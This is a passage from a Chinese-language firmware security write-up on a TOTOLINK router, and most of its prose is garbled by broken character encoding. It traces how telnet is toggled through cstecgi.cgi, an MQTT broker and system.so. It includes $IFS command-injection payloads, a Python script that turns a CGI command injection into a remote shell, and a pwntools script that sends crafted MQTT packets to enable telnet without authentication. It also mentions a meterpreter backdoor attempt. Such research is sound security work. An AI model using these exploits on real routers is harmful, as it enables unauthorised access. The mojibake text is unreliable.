¼ç»•è¿‡###\ncat${IFS}flag.txt\ncat$IFS$1flag.txt\ncat${IFS}$1flag.txt\n```\n\nshellä¸­$0,$1,$?ç­‰éƒ½æ˜¯ç‰¹æ®Šå˜é‡ï¼Œåœ¨shellä¸­`echo $0 $1 $2 'a'`ï¼Œå¯è§‚å¯Ÿåˆ°`$1`å’Œ`$2`ä¸ºç©ºï¼Œ`$0`ä¸ºbashï¼Œå…¶å®æ˜¯å› ä¸ºèµ·bashæ—¶å…¶å‚æ•°ä¸ºç©ºã€‚è¯¦ç»†å‚è€ƒ[shellç¼–ç¨‹å­¦ä¹ ç¬”è®°ä¹‹ç‰¹æ®Šå˜é‡](https://www.cnblogs.com/zhuandshao/p/7193564.html)ã€‚\n\n3ã€pythonå­—ç¬¦ä¸²çš„æ“ä½œä¸ç†Ÿæ‚‰\n\n```shell\n>>> dir('aaa')\n['__add__', '__class__', '__contains__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__getslice__', '__gt__', '__hash__', '__init__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '_formatter_field_name_split', '_formatter_parser', 'capitalize', 'center', 'count', 'decode', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'index', 'isalnum', 'isalpha', 'isdigit', 'islower', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']\n>>> help(''.replace)\n```\n\n**ï¼ï¼ï¼å½©è›‹ï¼ï¼ï¼**\n\n> ç²¾ç®€ç‰ˆçš„exp\n\n```python\nimport requests\n\nwhile(1):\n Â  Â print '$',\n Â  Â a = 'aabb;' + raw_input().replace(' ','$IFS$1') + ';'\n Â  Â response = requests.get(\"http://192.168.55.1/cgi-bin/downloadFlile.cgi\",params=a)\n Â  Â print response.text.replace(\"QUERY_STRING:aabb\",'')\n```\n\n# ä¸šåŠ¡åˆ†æ - where is telnet ?\n\nè™½ç„¶ä¸Šä¸€æ­¥éª¤ä¸­å®ç°äº†ä»»æ„å¼€å…³telnetï¼Œä½†ä½œä¸ºä¸€ä¸ªæ¡ˆä¾‹ï¼Œè¿˜æ˜¯æƒ³ä¸€æ¢ç©¶ç«Ÿå›ºä»¶ä¸­çœŸæ­£å»åšå¼€å…³åŠ¨ä½œçš„å‡½æ•°åœ¨å“ªå„¿ã€‚äºæ˜¯æœ‰äº†è¿™ä¸€å°èŠ‚çš„å†…å®¹ã€‚\n\né¦–å…ˆï¼Œåˆ†ææˆ‘ä»¬æŠ“åˆ°çš„è®¾ç½®telnetçš„httpåŒ…ï¼š\n\n```\nPOST /cgi-bin/cstecgi.cgi HTTP/1.1\nHost: 192.168.55.1\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://192.168.55.1/telnet.asp\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 56\nCookie: SESSION_ID=2:1516628334:2\nConnection: close\n\n{\"topicurl\":\"setting/setTelnetCfg\",\"telnet_enabled\":\"1\"}\n```\n\n**1ã€åœ¨cstecgi.cgiä¸­å¯»æ‰¾setTelnetCfgå’Œtelnet_enable**\n\nIDAä¸­å¯¹`cstecgi.cgi`æ–‡ä»¶æœç´¢äº†ä¸€ç•ªï¼Œå¹¶æœªæ‰¾åˆ°ä»»ä½•çº¿ç´¢ã€‚\n\n**2ã€å°è¯•å…¨å±€æœç´¢**\n\nå…¨å±€æœç´¢å­—ç¬¦ä¸²\"telnet_enable\"å’Œ\"setTelnetCfg\"\n\n```shell\nsquashfs-root$ grep -rin telnet_enabled\nweb_cste/telnet.asp:16:         supplyValue(\"telnet_enabled\",rJson['telnet_enabled']);\nweb_cste/telnet.asp:23: postVar['telnet_enabled']=$('#telnet_enabled').val();\nweb_cste/telnet.asp:38:<td><select class=\"select\" id=\"telnet_enabled\">\nBinary file lib/cste_modules/system.so matches\nBinary file lib/libapmib.so matches\nsquashfs-root$ grep -rin setTelnetCfg\nweb_cste/telnet.asp:22: var postVar={\"topicurl\" : \"setting/setTelnetCfg\"};\nBinary file lib/cste_modules/system.so matches\n```\n\ntelnet.aspæ˜¯å‰ç«¯ç”¨æ¥æ„é€ httpåŒ…çš„ï¼Œå› æ­¤æ— éœ€å…³æ³¨ã€‚é‡ç‚¹åœ¨lib/ä¸‹çš„ä¸¤ä¸ª.soæ–‡ä»¶ã€‚é€ä¸ªåˆ†æï¼š\n\n1ï¼‰lib/libapmib.so\n\nåœ¨IDAä¸­å¯¹libapmib.soè¿›è¡Œåˆ†æï¼Œæ‰¾åˆ°äº†\"telnet_enable\"å­—ç¬¦ä¸²ï¼Œç„¶è€Œå¹¶æœªæ‰¾åˆ°å¼•ç”¨ä½ç½®ã€‚æš‚å®šè¯¥soæ–‡ä»¶ä¸æ˜¯åˆ†æçš„ç›®æ ‡ã€‚\n\n2ï¼‰lib/cste_modules/system.so\n\nåœ¨system.soä¸­æ‰¾åˆ°ä¸¤å¤„å¯¹å­—ç¬¦ä¸²\"telnet_enable\"çš„å¼•ç”¨ï¼Œä¸€å¤„æ˜¯`getTelnetCfg()`ï¼Œå¦ä¸€å¤„æ˜¯`setTelnetCfg()`ã€‚é€šè¿‡åå­—å°±èƒ½çœ‹å‡ºåä¸€ä¸ªè®¾ç½®telnetæ˜¯æˆ‘ä»¬è¦çš„å‡½æ•°ï¼å…¶æºç é€»è¾‘å¦‚ä¸‹ï¼š\n\n```c\nint __fastcall setTelnetCfg(int a1, int a2, int a3)\n{\n Â const char *v5; // $v0\n Â int v7[3]; // [sp+18h] [-Ch] BYREF\n\n Â v5 = (const char *)websGetVar(a2, \"telnet_enabled\", \"0\");\n Â v7[0] = atoi(v5);\n Â apmib_set(0x4683, v7);\n Â if ( v7[0] == 1 )\n  {\n Â  Â system(\"killall telnetd 2> /dev/null\");\n Â  Â system(\"telnetd &\");            //è¿™ä¸€è¡Œå¼€å¯äº†telnetdè¿›ç¨‹\n  }\n Â else\n  {\n Â  Â system(\"killall telnetd 2> /dev/null\");\n  }\n Â apmib_update_web(4);\n Â return websSetCfgResponse(a1, a3, \"0\", \"reserv\");\n}\n```\n\nç»§ç»­è·Ÿè¸ªæ˜¯è°è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°ï¼Œè·Ÿè¸ªåˆ°äº†system.soä¸­çš„module_init()å‡½æ•°ã€‚\n\n```c\nint module_init()\n{\n Â cste_hook_register(\"getPasswordCfg\", getPasswordCfg);\n Â cste_hook_register(\"setPasswordCfg\", setPasswordCfg);\n Â cste_hook_register(\"NTPSyncWithHost\", NTPSyncWithHost);\n Â cste_hook_register(\"getNTPCfg\", &getNTPCfg);\n Â cste_hook_register(\"setNTPCfg\", setNTPCfg);\n Â cste_hook_register(\"getDDNSStatus\", getDDNSStatus);\n Â cste_hook_register(\"getDDNSCfg\", &getDDNSCfg);\n Â cste_hook_register(\"setDDNSCfg\", setDDNSCfg);\n Â cste_hook_register(\"getSyslogCfg\", &getSyslogCfg);\n Â cste_hook_register(\"clearSyslog\", clearSyslog);\n Â cste_hook_register(\"setSyslogCfg\", setSyslogCfg);\n Â cste_hook_register(\"getMiniUPnPConfig\", &getMiniUPnPConfig);\n Â cste_hook_register(\"setMiniUPnPConfig\", setMiniUPnPConfig);\n Â cste_hook_register(\"LoadDefSettings\", LoadDefSettings);\n Â cste_hook_register(\"RebootSystem\", RebootSystem);\n Â cste_hook_register(\"FirmwareUpgrade\", FirmwareUpgrade);\n Â cste_hook_register(\"getRebootScheCfg\", getRebootScheCfg);\n Â cste_hook_register(\"setRebootScheCfg\", setRebootScheCfg);\n Â cste_hook_register(\"getTelnetCfg\", getTelnetCfg);\n Â cste_hook_register(\"setTelnetCfg\", setTelnetCfg);             //åœ¨è¿™é‡Œæ³¨å†Œäº†setTelnetCfgï¼Œä½†æ˜¯è°è°ƒç”¨äº†è¿™å„¿å‘¢ï¼Ÿ\n Â cste_hook_register(\"SystemSettings\", SystemSettings);\n Â return 0;\n}\n```\n\n**3ã€æ•´ç†æ€è·¯**\n\nç°åœ¨å·²çŸ¥æœåŠ¡å™¨ç«¯ï¼ˆè·¯ç”±å™¨ï¼‰å¤„ç†è®¾ç½®telnet httpåŒ…çš„å…¥å£æ˜¯`cstecgi.cgi`ï¼Œæœ€ç»ˆæ‰§è¡Œè®¾ç½®telnetçš„åŠ¨ä½œæ˜¯åœ¨system.soä¸­ï¼Œä¸”å­—ç¬¦ä¸²`setTelnetCfg`ä»…èƒ½åœ¨è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸­æœç´¢åˆ°ã€‚\n\nåœ¨åˆ†æå®Œ`cstecgi.cgi`æºç åï¼Œå¹¶æœªæ‰¾åˆ°å¯¹system.soçš„è°ƒç”¨ã€‚åˆ°è¿™é‡Œï¼Œå‘ç°ä¸¤è€…çš„è”ç³»æ–­äº†ï¼ä½†æ˜¯å®ƒä»¬åˆä¸å¯èƒ½æ˜¯æ–­çš„ï¼Œè¯´æ˜æœ‰ä¸€ä¸ªä¸­é—´ä»¶ï¼Œå¯ä»¥å°†ä»–ä»¬äºŒè€…è”ç³»èµ·æ¥ã€‚é‚£ä¹ˆæœ‰äº†ä»¥ä¸‹åˆ†æè¿‡ç¨‹ï¼š\n\n1ï¼‰è¿™ä¸ªä¸­é—´ä»¶è‚¯å®šä¼šè°ƒç”¨system.soï¼Œé‚£ä¹ˆäºŒè¿›åˆ¶ä¸­ä¸€å®šæœ‰è¿™ä¸ªå­—ç¬¦ä¸²ã€‚äºæ˜¯å°è¯•å…¨å±€æœç´¢å­—ç¬¦ä¸²'system.so'ï¼ŒButï¼Œç»“æœä¸ºç©ºï¼Œå•¥ä¹Ÿæ²¡æœåˆ°ã€‚æ€ä¹ˆå›äº‹å‘¢ï¼Ÿ\n\n2ï¼‰æ®è¯´è¿˜æœ‰ä¸€ç§åŠ è½½soæ–‡ä»¶çš„æ–¹å¼ï¼Œé‚£å°±æ˜¯é€šè¿‡`dlopen(const char *filename, int flags)`ã€‚ä¸è¿‡ï¼Œdlopenæ‰“å¼€soæ–‡ä»¶æ˜¯éœ€è¦åˆ¶å®šè·¯å¾„+soæ–‡ä»¶åçš„ï¼Œè€Œæˆ‘ä»¬åˆšåˆšæœç´¢soæ–‡ä»¶åçš„ç»“æœä¸ºç©ºï¼Œè¯´æ˜æºç ä¸­å¯èƒ½å¯¹è·¯å¾„å’Œæ–‡ä»¶åè¿›è¡Œäº†æ‹¼æ¥ã€‚å°è¯•æ‰¾ä¸€ä¸‹è·¯å¾„å­—ç¬¦ä¸²ã€‚\n\n**4ã€å¯»æ‰¾å¯¹soæ–‡ä»¶æ‰€åœ¨è·¯å¾„çš„å¼•ç”¨**\n\nå¯¹äº`lib/cste_modules/system.so`ï¼Œæˆ‘ä»¬å°è¯•æœç´¢è·¯å¾„å­—ç¬¦ä¸²\"lib/cste_modules\"ï¼Œç»“æœå¦‚ä¸‹ï¼š\n\n```shell\nsquashfs-root$ grep -rin dlopen\nBinary file lib/libpthread-0.9.33.so matches\nBinary file lib/libcrypto.so.0.9.8 matches\nBinary file lib/libdl-0.9.33.so matches\nBinary file lib/librt-0.9.33.so matches\nBinary file bin/cs_broker matches\nBinary file bin/cste_sub matches        #æ»¡è¶³dlopen\nBinary file bin/lighttpd matches\nBinary file bin/tc matches\nsquashfs-root$ grep -rin lib/cste_modules\nBinary file bin/cste_sub matches        #æ»¡è¶³lib/cste_modulesè·¯å¾„\n```\n\næ ¹æ®æœç´¢ç»“æœï¼Œé”å®šåˆ°`bin/cste_sub`è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€‚IDAæ‰“å¼€è¯¥æ–‡ä»¶ï¼Œåœ¨å‡½æ•°çª—å£æœç´¢dlopenï¼Œå®šä½åˆ°å”¯ä¸€ä¸€å¤„å¯¹è¯¥å‡½æ•°çš„å¼•ç”¨ï¼š\n\n```c\nint load_modules()\n{\n...\n Â v0 = opendir(&dword_4037B0);      //dword_4037B0å¤„å­˜æ”¾çš„æ•°æ®å…¶ASCIIç¼–ç å¯¹åº”\"/lib/cste_modules/\"\n  ...\n Â  Â  Â while ( 1 )\n Â   {\n Â  Â  Â v7 = readdir(v0);         //whileå¾ªç¯ä¸­ï¼Œä»\"/lib/cste_modules/\"ç›®å½•å°†æ¯ä¸ªæ–‡ä»¶åä¾æ¬¡å–å‡º\n Â  Â  Â v8 = v7;\n Â  Â  Â if ( !v7 )\n Â  Â  Â  Â break;\n Â  Â  Â v3 = v7 + 11;             // v3æŒ‡å‘readdir()å‡½æ•°è¿”å›ç»“æ„ä½“ä¸­çš„d_nameï¼Œä¹Ÿå°±æ˜¯ç›®å½•ä¸‹çš„æ–‡ä»¶å\n Â  Â   ...\n Â  Â  Â  Â if ( (v5 & 0xF000) != 0x4000 )\n Â  Â  Â   {\n Â  Â  Â  Â  Â sprintf(v9, v13, &dword_4037B0, v3);      //é€šè¿‡sprintfå°†ç›®å½•+æ–‡ä»¶åè¾“å‡ºç»™v9\n Â  Â  Â  Â  Â flib = dlopen(v9, 1);                     //dlopenæ‰“å¼€\"/lib/cste_modules/xxx.so\"\n Â  Â  Â  Â  Â error_message = dlerror();\n Â  Â  Â  Â   ...\n}\n```\n\nå› æ­¤ï¼Œè°ƒç”¨system.soçš„ç¨‹åºä¸ºbin/ç›®å½•ä¸‹çš„cste_subï¼Œè¿™ä¸ªcste_subæ˜¯åšä»€ä¹ˆçš„å‘¢ï¼Ÿæˆ‘ä»¬åˆ©ç”¨è·¯ç”±å™¨shellä¸€æ¢ç©¶ç«Ÿã€‚\n\n**5ã€cste_subæ˜¯ä»€ä¹ˆ**\n\nè¿™é‡Œæˆ‘åˆ©ç”¨`python -m SimpleHTTPServer`åŠ`wget`ä¸Šä¼ äº†ä¸€ä¸ªå®Œæ•´ç‰ˆçš„`busybox-mipsel`åˆ°è·¯ç”±å™¨ä¸Šï¼Œé€šè¿‡netstatæŸ¥çœ‹ç«¯å£è¿æ¥æƒ…å†µï¼š\n\n```shell\n# ./busybox-mipsel netstat -pantu\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address Â  Â  Â  Â  Â  Foreign Address Â  Â  Â  Â  State Â  Â  Â  PID/Program name\ntcp Â  Â  Â  Â 0 Â  Â  Â 0 0.0.0.0:80 Â  Â  Â  Â  Â  Â  Â 0.0.0.0:* Â  Â  Â  Â  Â  Â  Â  LISTEN Â  Â  Â 1363/lighttpd\ntcp Â  Â  Â  Â 0 Â  Â  Â 0 0.0.0.0:53 Â  Â  Â  Â  Â  Â  Â 0.0.0.0:* Â  Â  Â  Â  Â  Â  Â  LISTEN Â  Â  Â 1279/dnsmasq\ntcp Â  Â  Â  Â 0 Â  Â  Â 0 0.0.0.0:23 Â  Â  Â  Â  Â  Â  Â 0.0.0.0:* Â  Â  Â  Â  Â  Â  Â  LISTEN Â  Â  Â 1343/telnetd\ntcp Â  Â  Â  Â 0 Â  Â  Â 0 0.0.0.0:1883 Â  Â  Â  Â  Â  Â 0.0.0.0:* Â  Â  Â  Â  Â  Â  Â  LISTEN Â  Â  Â 1324/cs_broker\ntcp Â  Â  Â  Â 0 Â  Â 162 192.168.55.1:23 Â  Â  Â  Â  192.168.55.2:49510 Â  Â   ESTABLISHED 1343/telnetd\ntcp Â  Â  Â  Â 0 Â  Â  Â 0 127.0.0.1:48295 Â  Â  Â  Â  127.0.0.1:1883 Â  Â  Â  Â   TIME_WAIT Â  -\ntcp Â  Â  Â  Â 0 Â  Â  Â 0 127.0.0.1:47306 Â  Â  Â  Â  127.0.0.1:1883 Â  Â  Â  Â   ESTABLISHED 9913/cste_sub\ntcp Â  Â  Â  Â 0 Â  Â  Â 0 127.0.0.1:1883 Â  Â  Â  Â  Â 127.0.0.1:47306 Â  Â  Â  Â  ESTABLISHED 1324/cs_broker\nnetstat: /proc/net/tcp6: No such file or directory\nudp Â  Â  Â  Â 0 Â  Â  Â 0 0.0.0.0:53 Â  Â  Â  Â  Â  Â  Â 0.0.0.0:* Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  1279/dnsmasq\nudp Â  Â  Â  Â 0 Â  Â  Â 0 0.0.0.0:67 Â  Â  Â  Â  Â  Â  Â 0.0.0.0:* Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  1028/udhcpd\nnetstat: /proc/net/udp6: No such file or directory\n```\n\nå¯ä»¥çœ‹åˆ°cste_subä½œä¸ºå®¢æˆ·ç«¯ï¼Œè·Ÿ1883ç«¯å£å»ºç«‹äº†è¿æ¥ï¼Œ1883ç«¯å£å¯¹åº”çš„ç¨‹åºåæ˜¯cs_brokerã€‚è€Œ1883ç«¯å£å¯¹åº”mqttæœåŠ¡ï¼Œå› æ­¤cs_brokerå°±æ˜¯mqttæœåŠ¡ã€‚\n\n**6ã€å†æ¬¡æ•´ç†æ€è·¯**\n\nç°åœ¨å·²çŸ¥çš„å‡ ä¸ªæ¨¡å—æœ‰ï¼š\n\n- `cstecgi.cgi`ï¼šæ˜¯lighttpdèµ·çš„å­è¿›ç¨‹ï¼Œå¤„ç†æ¥è‡ªå®¢æˆ·ç«¯å‘é€çš„è®¾ç½®telnetçš„httpåŒ…\n- `cste_sub`ï¼šè¯¥è¿›ç¨‹ä¸­åŠ è½½äº†system.soï¼Œå¹¶å®é™…æ‰§è¡Œäº†è®¾ç½®telnetå¼€å…³çš„æ“ä½œ\n- `cs_broker`ï¼šmqttæœåŠ¡ï¼Œè·Ÿcste_subä¹‹é—´æœ‰äº¤äº’\n\næ‰€ä»¥ä»cstecgi.cgiä¸­æœ‰ä¸¤æ¡è·¯å¯èƒ½è§¦å‘åˆ°system.soï¼š\n\n1ï¼‰`cstecgi.cgi` --ã€‹ `cste_sub`\n\n2ï¼‰`cstecgi.cgi`   --ã€‹ `cs_broker` --ã€‹ `cste_sub`\n\nä¸ºäº†å¼„æ¸…æ¥šåœ¨`cstecgi.cgi`ä¸­ç©¶ç«Ÿæ˜¯æ€æ ·è°ƒç”¨çš„ï¼Œæˆ‘ä»¬å†æ¬¡å›åˆ°IDAä¸­åˆ†æï¼š\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n...\n Â if ( strstr(v30, \"postapIpAddr\") )\n  {\n Â  Â v5 = cJSON_GetObjectItem(v18, \"postapIpAddr\");\n Â  Â set_CSTEInfo(*(_DWORD *)(v5 + 16), 1883, 60);       //çœ‹åˆ°äº†1883ç«¯å£\n Â  Â v6 = cJSON_GetObjectItem(v18, \"aptopicurl\");\n Â  Â web_getData(0, *(_DWORD *)(v6 + 16), v30, (int)v35);\n  }\n Â else\n  {\n Â  Â set_CSTEInfo(\"127.0.0.1\", 1883, 60);            //çœ‹åˆ°äº†1883ç«¯å£\n Â  Â web_getData(0, v23, v30, (int)v35);\n  }\n...\n}\n```\n\nå‘ç°äº†å¯¹1883ç«¯å£çš„è°ƒç”¨ï¼Œä»¥åŠä¸¤ä¸ªå‡½æ•°`set_CSTEInfo()`å’Œ`web_getData()`ã€‚å› æ­¤ç¬¦åˆä¸Šè¿°2ï¼‰çš„æƒ…å†µï¼Œå¯ä»¥å¤§è‡´æ¨æµ‹å‡ºï¼Œ`cstecgi.cgi`é€šè¿‡è¿™ä¸¤ä¸ªå‡½æ•°å®ç°è·Ÿ`cste_broker`è¿›è¡Œé€šä¿¡ï¼Œè€Œå`cste_broker`å°†æ•°æ®ä¼ é€’ç»™`cste_sub`è¿›è¡Œå¤„ç†ã€‚\n\n**7ã€libmosquitto**\n\nç»å…¨å±€æœç´¢ï¼Œ`set_CSTEInfo()`ä¸`web_getData()`çš„å‡½æ•°å®ç°åœ¨`lib/libmosquitto.so`ä¸­ã€‚libmosquittoåŸæœ¬æ˜¯ä¸€ä¸ªå¼€æºçš„ç»„ä»¶ï¼Œè¿™é‡ŒTOTOLINKå‚å•†å¯¹å…¶è¿›è¡ŒäºŒæ¬¡å¼€å‘åšäº†äº›æ›´æ”¹ã€‚å¯ä»¥çŸ¥é“çš„æ˜¯ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°å®ç°äº†ä¹‹é—´çš„é€šä¿¡ã€‚`cstecgu.cgi`åˆ°åº•å‘é€äº†ä»€ä¹ˆï¼Œæˆ‘ä»¬é€šè¿‡ç½‘ç»œæŠ“åŒ…åˆ†ææ˜¯æ›´ä¸ºç›´æ¥å’Œå‡†ç¡®çš„åŠæ³•ï¼\n\nè¿™ä¸€éƒ¨åˆ†å†…å®¹ï¼Œå‚è€ƒMQTTç›¸å…³ç« èŠ‚ã€‚\n\n# MQTTæœåŠ¡\n\nå…³äºä»€ä¹ˆæ˜¯MQTTï¼Œè€å¾çš„æ–‡ç« é‡Œå†™çš„å¾ˆæ¸…æ¥šï¼š[ç‰©è”ç½‘è®¾å¤‡æ¶ˆæ¯æ€»çº¿æœºåˆ¶çš„ä½¿ç”¨åŠå®‰å…¨é—®é¢˜](https://gtrboy.github.io/posts/bus/#0x01-mqtt%E5%8D%8F%E8%AE%AE)\n\nè¿™é‡Œè®°å½•ä¸€ä¸‹æˆ‘åœ¨TOTOLINKä¸ŠæŠ“åŒ…åˆ†æMQTTæŠ¥æ–‡çš„è¿‡ç¨‹ã€‚\n\n## mqttæŠ¥æ–‡åˆ†æ\n\nç”±äºè·¯ç”±å™¨ä¸Šæ²¡æœ‰tcpdumpï¼Œæ‰€ä»¥è€ƒè™‘ç¼–è¯‘ä¸€ä¸ªé™æ€é“¾æ¥çš„tcpdumpï¼Œç”¨äºæŠ“è·¯ç”±å™¨ä¸Šçš„é€šä¿¡æŠ¥æ–‡ã€‚\n\n### æœ¬åœ°ç¼–è¯‘tcpdump\n\nå› ä¸ºç¬¬ä¸€æ¬¡ç¼–tcpdumpï¼Œæ‰€ä»¥å…ˆåœ¨æœ¬åœ°ç¼–ä¸€ä¸ªx86æ¶æ„çš„ç‰ˆæœ¬è¯•è¯•ã€‚\n\n1. å®˜ç½‘ä¸‹è½½tcpdumpå’Œlibpcap\n\n2. ç¼–è¯‘libpcap\n\n   ```shell\n   ./configure\n   make\n   make install\n   ```\n\n3. ç¼–è¯‘tcpdump\n\n   ```shell\n   ./configure\n   make --without-crypto CFLAGS=-static\n   ```\n\n### äº¤å‰ç¼–è¯‘mipselç‰ˆtcpdump \n\n1. ä¸‹è½½tcpdumpå’Œlibpacapæºç \n\n2. ubuntuä¸­å®‰è£…mipsel gcc\n\n   ```shell\n   sudo apt install gcc-mipsel-linux-gnu\n   ```\n\n3. ç¼–è¯‘libpcap\n\n   ```shell\n   ./configure --prefix=/home/bling/mipsel_libpcap     #è¯¥ç›®å½•å¯æ ¹æ®æƒ…å†µæ›´æ”¹\n   make CC=mipsel-linux-gnu-gcc\n   make install CC=mipsel-linux-gnu-gcc Â  Â  Â  #ç¼–è¯‘çš„libpcapå®‰è£…åˆ°äº†/home/bling/mipsel_libpcapç›®å½•ä¸‹\n   ```\n\n4. ç¼–è¯‘tcpdump\n\n   - åŠ¨æ€é“¾æ¥\n\n   ```shell\n   cd tcpdump-4.99.1/\n   ./configure\n   make CC=mipsel-linux-gnu-gcc CFLAGS='-I/home/bling/mipsel_libpcap/include' LDFLAGS='-L/home/bling/mipsel_libpcap/lib/libpcap.a'\n   ```\n\n   - é™æ€é“¾æ¥\n\n   ```shell\n   cd tcpdump-4.99.1/\n   ./configure\n   make CC=mipsel-linux-gnu-gcc CFLAGS='-I/home/bling/mipsel_libpcap/include -static' LDFLAGS='-L/home/bling/mipsel_libpcap/lib/libpcap.a -static'\n   ```\n\n### **ä½¿ç”¨tcpdumpæŠ“æŠ¥æ–‡**\n\n```shell\n./tcpdump -i lo -w ./test.pcap\n```\n\n### **å°é—­æœåŠ¡å™¨æ•°æ®å›ä¼ **\n\nè·¯ç”±å™¨ç›¸å½“äºä¸€ä¸ªå°é—­æœåŠ¡å™¨ï¼Œä¸ºäº†å°†è·¯ç”±å™¨ä¸­tcpdumpçš„åŒ…ä¼ ç»™æˆ‘ä»¬æœ¬åœ°åˆ†æï¼Œæœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•ï¼š\n\n- wget post\n- tftpd\n- metepreteræ¤å…¥åé—¨ä¸‹è½½ï¼ˆæœ€æ–¹ä¾¿ï¼‰\n- base64ç¼–ç \n\n1. meterpreteræ¤å…¥åé—¨ä¸‹è½½ï¼ˆå°è¯•å¤±è´¥ï¼‰\n\n2. base64ç¼–ç \n\n   ```shell\n   cat /tmp/test.pcap  | /tmp/busybox-mipsel base64        # ç¼–ç è¿‡ç¨‹\n   # å°†base64ç¼–ç çš„å†…å®¹ä¿å­˜åˆ°æœ¬åœ°æ–‡ä»¶pcap64\n   cat pcap64 | base64 -d > test.pcap          # è§£ç è¿‡ç¨‹\n   ```\n\nå¦ä¸¤ç§æ–¹æ³•æš‚æœªå°è¯•ã€‚\n\n### **pcapæŠ¥æ–‡åˆ†æ**\n\nwiresharkä¸­æ‰“å¼€åˆšåˆšä½¿ç”¨tcpdumpæ•è·çš„pcapæŠ¥æ–‡ï¼Œå°±å¯ä»¥åˆ†æmqttç›¸å…³çš„æ¡ç›®äº†ã€‚è¿™é‡Œé™„ä¸Šå¾—åˆ°çš„pcapæ–‡ä»¶ï¼š[test.pcap](test.pcap)\n\nå…¶å®wiresharkå·²ç»æ ¹æ®mqttåè®®éƒ½å¸®æˆ‘ä»¬åˆ†æå¥½äº†ï¼Œæˆ‘ä»¬å¯ä»¥è·Ÿè¸ªå„tcpæµçœ‹çœ‹æ”¶å‘æƒ…å†µï¼Œç†è§£ä¸€ä¸‹cs_brokerå’Œcste_subä¹‹é—´ï¼Œä»¥åŠcs_brokerå’Œcstecgi.cgiä¹‹é—´çš„æ•°æ®äº¤äº’è¿‡ç¨‹ã€‚\n\nmqttåè®®å¯å‚è€ƒï¼š[MQTTåè®®ä¸­æ–‡ç‰ˆ](https://mcxiaoke.gitbooks.io/mqtt-cn/content/)\n\n## æ„é€ mqttæŠ¥æ–‡\n\n### **mqtt.fxçš„subscribeä¸publish**\n\nä¸‹è½½é“¾æ¥ï¼š[mqtt.fxä¸‹è½½](https://mqttfx.jensd.de/index.php/download)\n\né€šè¿‡subscribe # å¯ä»¥ç›‘å¬æ‰€æœ‰çš„topicã€‚\n\nç”¨mqtt.fxæŠ“ä¸€ä¸ªâ€œæ‰“å¼€telnetå¼€å…³â€çš„åŒ…ï¼Œç„¶åé€šè¿‡publishç•Œé¢é‡æ”¾ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n\n![image-20210815211654119.png](image-20210815211654119.png)\n\nè¿™ä¸€æ“ä½œè¿‡ç¨‹ï¼Œåœ¨æœ¬åœ°ç”¨wiresharkæŠ“äº†ä¸€ä¸ªåŒ…ï¼Œ[set_telnet_1.pcapng](set_telnet_1.pcapng)ã€‚\n\nåˆ†æè¿‡ç¨‹å¦‚ä¸‹ï¼Œæ ¹æ®æ­¤åˆ†æï¼Œå¯ä»¥ä½¿ç”¨pwntoolsæ„é€ mqttæŠ¥æ–‡æ¥å®ç°è·¯ç”±å™¨telnetçš„å¼€å…³ã€‚\n\n![image-20210815212828443.png](image-20210815212828443.png)\n\n### åˆ©ç”¨pwntoolsæ„é€ \n\næ ¹æ®ä¸Šæ–‡ä¸­wiresharkçš„åˆ†æï¼Œåˆ©ç”¨pwntoolsæˆ‘ä»¬åªéœ€æ„é€ ä¸€æ¬¡connect+ä¸€æ¬¡setTelnetCfgå°±è¡Œï¼ˆremote()å‡½æ•°æœ¬èº«å°±æ˜¯å»ºç«‹TCPè¿æ¥ï¼Œå› æ­¤è¿™ä¸ªå±‚é¢çš„ä¸œè¥¿æˆ‘ä»¬æ— éœ€è€ƒè™‘ï¼‰ã€‚éå¸¸ç®€å•ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\n\nio = remote(\"192.168.55.1\",1883)\n\nmsg1 = \"\\x10\\x1a\\x00\\x04\\x4d\\x51\\x54\\x54\\x04\\x02\\x00\\x3c\\x00\\x0e\\x4d\\x51\\x54\\x54\\x5f\\x46\\x58\\x5f\\x43\\x6c\\x69\\x65\\x6e\\x74\"\nmsg2 = \"\\x30\\x65\\x00\\x24\\x74\\x6f\\x74\\x6f\\x6c\\x69\\x6e\\x6b\\x2f\\x72\\x6f\\x75\\x74\\x65\\x72\\x2f\\x73\\x65\\x74\\x74\\x69\\x6e\\x67\\x2f\\x73\\x65\\x74\\x54\\x65\\x6c\\x6e\\x65\\x74\\x43\\x66\\x67\\x7b\\x0a\\x09\\x22\\x74\\x6f\\x70\\x69\\x63\\x75\\x72\\x6c\\x22\\x3a\\x09\\x22\\x73\\x65\\x74\\x74\\x69\\x6e\\x67\\x2f\\x73\\x65\\x74\\x54\\x65\\x6c\\x6e\\x65\\x74\\x43\\x66\\x67\\x22\\x2c\\x0a\\x09\\x22\\x74\\x65\\x6c\\x6e\\x65\\x74\\x5f\\x65\\x6e\\x61\\x62\\x6c\\x65\\x64\\x22\\x3a\\x09\\x22\\x31\\x22\\x0a\\x7d\"\n\nio.send(msg1)       # connect\nsleep(0.2)\nio.send(msg2)       # setTelnetCfg 1\n```\n\n### python MQTTåº“æ„é€ \n\n[Python MQTT 